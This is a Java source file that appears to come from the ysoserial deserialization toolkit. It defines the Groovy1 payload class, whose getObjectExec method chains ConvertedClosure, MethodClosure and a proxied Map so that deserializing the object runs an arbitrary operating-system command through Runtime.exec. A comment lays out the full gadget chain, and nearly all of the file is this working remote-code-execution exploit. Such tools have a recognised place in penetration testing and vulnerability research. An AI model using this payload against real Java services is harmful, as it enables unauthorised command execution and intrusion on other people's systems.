package ysoserial.payloads;

import java.lang.reflect.InvocationHandler;
import java.util.Map;

import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;

import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;

/*
	Gadget chain:	
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				Comparator.compare() (Proxy)
					ConvertedClosure.invoke()
						MethodClosure.call()
							...
						  		Method.invoke()
									Runtime.exec()
	
	Requires:
		groovy
 */

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({"org.codehaus.groovy:groovy:2.3.9"})
public class Groovy1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {

	public InvocationHandler getObjectExec(final String command) throws Exception {
		final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(command, "execute"), "entrySet");
				
		final Map map = Gadgets.createProxy(closure, Map.class);		
		
		final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(map);
		
		return handler;
	}	
	
	public InvocationHandler getObjectSleep(final String command) throws Exception {
		/*
		final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(java.lang.Thread.class, "sleep"), "entrySet");
		
		final Map map = Gadgets.createProxy(closure, Map.class);		
		
		final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(map);
		
		return handler;
		*/
		return null;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(Groovy1.class, args);
	}	
}
